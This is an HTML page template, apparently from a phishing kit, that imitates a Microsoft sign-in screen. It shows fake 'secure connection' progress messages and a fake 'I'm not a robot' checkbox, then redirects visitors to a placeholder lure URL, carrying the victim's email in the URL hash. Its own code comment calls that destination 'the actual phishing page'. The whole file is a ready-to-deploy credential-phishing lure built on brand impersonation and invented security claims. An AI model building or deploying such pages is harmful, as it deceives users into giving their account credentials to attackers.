<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f3f2f1;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .container {
            max-width: 440px;
            width: 100%;
            padding: 20px;
        }
        
        .card {
            background: #ffffff;
            border-radius: 4px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
            padding: 44px 48px 40px;
            text-align: center;
        }
        
        /* Microsoft Logo */
        .logo {
            margin-bottom: 32px;
            display: inline-block;
        }
        
        .logo-grid {
            display: inline-grid;
            grid-template-columns: 16px 16px;
            grid-gap: 2px;
        }
        
        .logo-square {
            width: 16px;
            height: 16px;
        }
        
        .title {
            font-size: 20px;
            font-weight: 500;
            color: #323130;
            margin-bottom: 12px;
        }
        
        .subtitle {
            font-size: 14px;
            color: #605e5c;
            margin-bottom: 28px;
            line-height: 1.5;
        }
        
        /* Preloader */
        .preloader {
            width: 40px;
            height: 40px;
            margin: 0 auto 24px;
            border: 4px solid #f3f2f1;
            border-top: 4px solid #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .progress-text {
            font-size: 13px;
            color: #605e5c;
            margin-bottom: 32px;
        }
        
        /* Checkbox */
        .checkbox-container {
            display: none;
            background: #faf9f8;
            border: 1px solid #edebe9;
            border-radius: 4px;
            padding: 20px;
            margin: 24px 0;
            cursor: pointer;
            user-select: none;
            transition: all 0.2s;
        }
        
        .checkbox-container:hover {
            background: #f3f2f1;
            border-color: #d2d0ce;
        }
        
        .checkbox-container.active {
            display: block;
        }
        
        .checkbox-container.verified {
            background: #e7f3ff;
            border-color: #0078d4;
        }
        
        .checkbox-wrapper {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 15px;
            color: #323130;
        }
        
        .checkbox {
            width: 24px;
            height: 24px;
            border: 2px solid #605e5c;
            border-radius: 2px;
            position: relative;
            flex-shrink: 0;
            transition: all 0.3s;
        }
        
        .checkbox.checked {
            background: #0078d4;
            border-color: #0078d4;
        }
        
        .checkbox.checked::after {
            content: '';
            position: absolute;
            left: 7px;
            top: 3px;
            width: 6px;
            height: 12px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }
        
        .footer {
            margin-top: 24px;
            padding-top: 20px;
            border-top: 1px solid #edebe9;
            font-size: 12px;
            color: #a19f9d;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
        
        .shield-icon {
            width: 16px;
            height: 16px;
            fill: #a19f9d;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <!-- Microsoft Logo -->
            <div class="logo">
                <div class="logo-grid">
                    <div class="logo-square" style="background: #f25022;"></div>
                    <div class="logo-square" style="background: #7fba00;"></div>
                    <div class="logo-square" style="background: #00a4ef;"></div>
                    <div class="logo-square" style="background: #ffb900;"></div>
                </div>
            </div>
            
            <!-- Preloader Stage -->
            <div id="preloader-stage">
                <div class="preloader"></div>
                <h2 class="title">Preparing your sign-in</h2>
                <p class="subtitle">Please wait while we set up a secure connection...</p>
                <p class="progress-text" id="progress-text">Initializing...</p>
            </div>
            
            <!-- Verification Stage -->
            <div id="verification-stage" style="display: none;">
                <h2 class="title">Verify you're human</h2>
                <p class="subtitle">This helps protect your account from automated attacks</p>
                
                <div class="checkbox-container" id="captcha-checkbox">
                    <div class="checkbox-wrapper">
                        <div class="checkbox" id="checkbox"></div>
                        <span>I'm not a robot</span>
                    </div>
                </div>
                
                <div class="footer">
                    <svg class="shield-icon" viewBox="0 0 16 16">
                        <path d="M8 0C3.58 0 0 3.58 0 8s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm1 13H7V7h2v6zm0-8H7V3h2v2z"/>
                    </svg>
                    <span>Protected by Microsoft Security</span>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        (function() {
            'use strict';
            
            // Check if already verified
            if (sessionStorage.getItem('msft_verified') === 'true') {
                // Skip captcha and go directly to login - preserve hash for email
                window.location.href = '{lure_url_html}' + window.location.hash;
                return;
            }
            
            // Progress messages
            var progressMessages = [
                'Initializing secure connection...',
                'Verifying SSL certificate...',
                'Establishing encrypted tunnel...',
                'Loading authentication module...',
                'Preparing verification...'
            ];
            
            var currentProgress = 0;
            var progressInterval = setInterval(function() {
                if (currentProgress < progressMessages.length) {
                    document.getElementById('progress-text').textContent = progressMessages[currentProgress];
                    currentProgress++;
                } else {
                    clearInterval(progressInterval);
                    
                    // Show verification after "loading"
                    setTimeout(showVerification, 600);
                }
            }, 400); // Each message shows for 400ms
            
            function showVerification() {
                document.getElementById('preloader-stage').style.display = 'none';
                document.getElementById('verification-stage').style.display = 'block';
                
                var checkboxContainer = document.getElementById('captcha-checkbox');
                var checkbox = document.getElementById('checkbox');
                
                // Make checkbox visible
                checkboxContainer.classList.add('active');
                
                // Attach click handler
                checkboxContainer.addEventListener('click', function() {
                    checkbox.classList.add('checked');
                    checkboxContainer.classList.add('verified');
                    
                    // Simulate verification delay
                    setTimeout(function() {
                        // Mark as verified
                        sessionStorage.setItem('msft_verified', 'true');
                        
                        // Extract original URL params and redirect to actual phishing page
                        var targetUrl = '{lure_url_html}' + window.location.hash;
                        
                        // Fade out and redirect
                        document.querySelector('.card').style.transition = 'opacity 0.5s';
                        document.querySelector('.card').style.opacity = '0';
                        
                        setTimeout(function() {
                            window.location.href = targetUrl;
                        }, 500);
                    }, 800);
                });
            }
        })();
    </script>
</body>
</html>
